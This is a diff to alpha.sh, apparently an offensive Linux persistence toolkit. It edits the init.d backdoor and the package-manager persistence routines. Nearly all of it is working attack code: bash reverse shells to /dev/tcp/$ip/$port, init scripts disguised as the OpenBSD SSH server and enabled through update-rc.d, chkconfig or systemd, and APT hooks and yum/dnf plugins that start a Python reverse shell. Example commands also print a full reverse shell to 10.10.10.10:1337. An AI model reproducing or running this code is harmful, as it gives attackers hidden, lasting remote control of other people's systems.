@@ -1802,6 +1802,7 @@ setup_initd_backdoor() {
 
 	usage_initd_backdoor() {
 		echo "Usage: ./alpha.sh --initd-backdoor [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default init.d settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -1834,6 +1835,15 @@ setup_initd_backdoor() {
 				shift
 				initd_path=$1
 				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --initd --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
+				exit 0
+				;;
 			--help|-h)
 				usage_initd_backdoor
 				exit 0
@@ -1858,6 +1868,65 @@ setup_initd_backdoor() {
 		exit 1
 	fi
 
+	create_initd_script() {
+		local payload=$1
+		mkdir -p /etc/init.d
+		cat <<-EOF > $initd_path
+		#! /bin/sh
+		### BEGIN INIT INFO
+		# Provides:             ssh sshd
+		# Required-Start:       \$remote_fs \$syslog \$network
+		# Required-Stop:        \$remote_fs \$syslog
+		# Default-Start:        2 3 4 5
+		# Default-Stop:        
+		# Short-Description:    OpenBSD Secure Shell server
+		### END INIT INFO
+
+		$payload
+		EOF
+		chmod +x $initd_path
+	}
+
+	establish_persistence() {
+		if sudo which update-rc.d >/dev/null 2>&1; then
+			sudo update-rc.d $(basename $initd_path) defaults
+		elif sudo which chkconfig >/dev/null 2>&1; then
+			sudo chkconfig --add $(basename $initd_path)
+			sudo chkconfig $(basename $initd_path) on
+		elif sudo which systemctl >/dev/null 2>&1; then
+			# Create systemd service
+			local service_name=$(basename $initd_path)
+			local service_path="/etc/systemd/system/${service_name}.service"
+			cat <<-EOF > $service_path
+			[Unit]
+			Description=Custom Init Script
+			After=network.target
+
+			[Service]
+			Type=simple
+			ExecStart=$initd_path start
+			ExecStop=$initd_path stop
+			ExecReload=$initd_path reload
+			Restart=always
+			RestartSec=5
+			TimeoutStopSec=30
+			TimeoutStartSec=30
+
+			[Install]
+			WantedBy=multi-user.target
+			EOF
+			sudo systemctl daemon-reload
+			sudo systemctl enable $service_name
+			sudo systemctl start $service_name &
+		elif sudo which service >/dev/null 2>&1; then
+			# Using service to start the script directly
+			sudo service $(basename $initd_path) start
+		else
+			echo "Error: No suitable method found to establish persistence."
+			exit 1
+		fi
+	}
+
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
@@ -1865,28 +1934,14 @@ setup_initd_backdoor() {
 			exit 1
 		fi
 
+		local payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
 		if [[ ! -f $initd_path ]]; then
-			cat <<-EOF > $initd_path
-			#! /bin/sh
-			### BEGIN INIT INFO
-			# Provides:             ssh sshd
-			# Required-Start:       \$remote_fs \$syslog
-			# Required-Stop:        \$remote_fs \$syslog
-			# Default-Start:        2 3 4 5
-			# Default-Stop:        
-			# Short-Description:    OpenBSD Secure Shell server
-			### END INIT INFO
-
-			nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
-			EOF
-			chmod +x $initd_path
-			update-rc.d $(basename $initd_path) defaults
-			echo "[+] init.d backdoor established with IP $ip and port $port."
+			create_initd_script "$payload"
 		else
-			echo "nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> $initd_path
-			update-rc.d $(basename $initd_path) defaults
-			echo "[+] Payload added to existing init.d script with IP $ip and port $port."
+			echo "$payload" >> $initd_path
 		fi
+		establish_persistence
+		echo "[+] init.d backdoor established!"
 
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $initd_path ]]; then
@@ -1896,27 +1951,12 @@ setup_initd_backdoor() {
 		fi
 
 		if [[ ! -f $initd_path ]]; then
-			cat <<-EOF > $initd_path
-			#! /bin/sh
-			### BEGIN INIT INFO
-			# Provides:             ssh sshd
-			# Required-Start:       \$remote_fs \$syslog
-			# Required-Stop:        \$remote_fs \$syslog
-			# Default-Start:        2 3 4 5
-			# Default-Stop:        
-			# Short-Description:    OpenBSD Secure Shell server
-			### END INIT INFO
-			
-			$command
-			EOF
-			chmod +x $initd_path
-			update-rc.d $(basename $initd_path) defaults
-			echo "[+] init.d backdoor established"
+			create_initd_script "$command"
 		else
 			echo "$command" >> $initd_path
-			update-rc.d $(basename $initd_path) defaults
-			echo "[+] existing init.d backdoor established"
 		fi
+		establish_persistence
+		echo "[+] init.d backdoor established"
 	fi
 }
 
@@ -1932,9 +1972,10 @@ setup_package_manager_persistence() {
 
 	usage_package_manager_persistence() {
 		echo "Usage: ./alpha.sh --package-manager [OPTIONS]"
-		echo "  --ip <ip>                    Specify IP address"
-		echo "  --port <port>                Specify port number"
-		echo "  --apt | --yum | --dnf        Use APT, YUM or DNF package manager"
+		echo "--examples                   Display command examples"
+		echo "--ip <ip>                    Specify IP address"
+		echo "--port <port>                Specify port number"
+		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1949,6 +1990,11 @@ setup_package_manager_persistence() {
 				;;
 			--apt | --dnf | --yum )
 				mechanism="$1"
+				;;
+			--examples )
+				echo "Example:"
+				echo "sudo ./alpha.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
+				exit 0
 				;;
 			--help|-h)
 				usage_package_manager_persistence
@@ -1967,51 +2013,8 @@ setup_package_manager_persistence() {
 		echo "Try './alpha.sh --package-manager --help' for more information."
 		exit 1
 	fi
-
-	local python_script=$(cat <<- EOF
-	#!/usr/bin/env python
-	HOST = "$ip"
-	PORT = $port
-
-	def connect(host_port):
-		import socket
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(host_port)
-		return s
-
-	def wait_for_command(s):
-		import subprocess
-		data = s.recv(1024)
-		if data == "quit\n":
-			s.close()
-			sys.exit(0)
-		elif len(data) == 0:
-			return True
-		else:
-			proc = subprocess.Popen(data, shell=True,
-									stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-									stdin=subprocess.PIPE)
-			stdout_value = proc.stdout.read() + proc.stderr.read()
-			s.send(stdout_value)
-			return False
-
-	def main():
-		import sys, os, socket, time
-		while True:
-			socket_died = False
-			try:
-				s = connect((HOST, PORT))
-				while not socket_died:
-					socket_died = wait_for_command(s)
-				s.close()
-			except socket.error:
-				pass
-			time.sleep(5)
-
-	if __name__ == "__main__":
-		main()
-	EOF
-	)
+	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
+	local python_script=$(echo -e "#!/usr/bin/env python\nHOST = \"$ip\"\nPORT = $port\n\ndef connect(host_port):\n\timport socket\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(host_port)\n\treturn s\n\ndef wait_for_command(s):\n\timport subprocess\n\tdata = s.recv(1024)\n\tif data == \"quit\":\n\n\t\ts.close()\n\t\tsys.exit(0)\n\telif len(data) == 0:\n\t\treturn True\n\telse:\n\t\tproc = subprocess.Popen(data, shell=True,\n\t\tstdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\t\tstdin=subprocess.PIPE)\n\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\ts.send(stdout_value)\n\t\treturn False\n\ndef main():\n\timport sys, os, socket, time\n\twhile True:\n\t\tsocket_died = False\n\t\ttry:\n\t\t\ts = connect((HOST, PORT))\n\t\t\twhile not socket_died:\n\t\t\t\tsocket_died = wait_for_command(s)\n\t\t\ts.close()\n\t\texcept socket.error:\n\t\t\tpass\n\t\ttime.sleep(5)\n\nif __name__ == \"__main__\":\n\tmain()")
 
 	case $mechanism in
 		--apt )
@@ -2025,6 +2028,7 @@ setup_package_manager_persistence() {
 			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
 			echo "[+] APT persistence established"
 			;;
+
 		--yum )
 			if [[ ! -x "$(command -v yum)" ]]; then
 				echo "Yum is not installed. Please install Yum to use this option."
@@ -2042,22 +2046,13 @@ setup_package_manager_persistence() {
 			chmod +x /usr/lib/yumcon
 
 			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
+			
+			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
+			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py
 
-			cat <<- 'EOF' > /usr/lib/yum-plugins/yumcon.py
-			import os
-
-			try:
-				from yum.plugins import TYPE_INTERACTIVE, PluginYumExit
-				requires_api_version = '2.0'
-				plugin_type = TYPE_INTERACTIVE
-			except ImportError:
-				requires_api_version = '1.0'
-
-			def pretrans_hook(conduit):
-				os.system('setsid /usr/lib/yumcon 2>/dev/null & ')
-			EOF
 			echo "[+] Yum persistence established"
 			;;
+
 		--dnf )
 			if [[ ! -x "$(command -v dnf)" ]]; then
 				echo "DNF is not installed. Please install DNF to use this option."
@@ -2071,28 +2066,12 @@ setup_package_manager_persistence() {
 			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
 			chmod +x /usr/lib/$python_version/site-packages/dnfcon
 
+			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
+			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+			
 			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
 
-			cat <<- EOF > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-			import dnf
-			import os
-
-			def execute_dnfcon():
-				os.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')
-
-			class BackdoorPlugin(dnf.Plugin):
-				name = 'dnfcon'
-
-				def __init__(self, base, cli):
-					super(BackdoorPlugin, self).__init__(base, cli)
-					execute_dnfcon()
-
-			def __init__(self, base, conf, **kwargs):
-				dnf.Plugin.__init__(self, base, conf, **kwargs)
-				execute_dnfcon()
-
-			plugin = BackdoorPlugin
-			EOF
 			echo "[+] DNF persistence established"
 			;;
 	esac
